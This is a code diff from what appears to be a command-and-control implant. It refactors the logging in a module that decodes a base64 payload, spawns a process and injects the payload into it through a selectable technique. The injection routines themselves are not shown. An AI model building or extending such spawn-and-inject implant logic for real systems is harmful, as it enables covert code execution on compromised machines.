@@ -42,40 +42,51 @@ namespace Agent
             //Create new process
             byte[] buf = Misc.Base64DecodeToByteArray(args.asm);
 
-            logger.Log("Spawning Process.");
+            await WriteDebug("Spawning Process.", job.task.id);
             if (!await this.spawner.Spawn(args.GetSpawnOptions(job.task.id)))
             {
                 await messageManager.WriteLine("Process spawn failed.", job.task.id, true);
                 return;
             }
 
-            logger.Log("Getting Process Handle.");
+            await WriteDebug("Getting Process Handle.", job.task.id);
             if (!spawner.TryGetHandle(job.task.id, out var handle))
             {
                 await messageManager.WriteLine("Failed to get handle for process", job.task.id, true);
                 return;
             }
-            logger.Log("Selecting Technique with ID: " + this.config.inject);
+
+            await WriteDebug("Selecting Technique with ID: " + this.config.inject, job.task.id);
             try
             {
                 var technique = techniques.Where(x => x.id == this.config.inject).First();
                 if (technique is null)
                 {
-                    logger.Log("Technique is Null.");
+                    await WriteDebug("Technique is Null.", job.task.id);
                     Console.WriteLine("Failed to find injection technique.");
                     return;
                 }
+                
+                //Make sure we can resolve all the API's we need before spawning a process
+                if (!technique.resolved)
+                {
+                    if (!technique.Resolve())
+                    {
+                        await messageManager.WriteLine("Failed to resolve function locations", job.task.id, true, "error");
+                        return;
+                    }
+                }
 
-                logger.Log("Spawning Process.");
+                await WriteDebug("Spawning Process.", job.task.id);
                 if (!technique.Inject(buf, handle.DangerousGetHandle()))
                 {
-                    await messageManager.WriteLine("Inject Failed.", job.task.id, true);
+                    await messageManager.WriteLine("Inject Failed.", job.task.id, true, "error");
                     return;
                 }
             }
             catch (Exception e)
             {
-                logger.Log(e.ToString());
+                await WriteDebug(e.ToString(), job.task.id);
             }
 
             await messageManager.WriteLine("Inject Failed.", job.task.id, true);
@@ -93,17 +104,19 @@ namespace Agent
                 }
                 try
                 {
-                    ITechnique technique = (ITechnique)Activator.CreateInstance(t);
-
-                    if (technique is not null)
-                    {
-                        techniques.Add(technique);
-                    }
+                    techniques.Add((ITechnique)Activator.CreateInstance(t));
                 }
                 catch
                 {
                     continue;
                 }
+            }
+        }
+
+        private async Task WriteDebug(string message, string task_id){
+            if (config.debug)
+            {
+                await this.messageManager.WriteLine(message, task_id, false);
             }
         }
     }
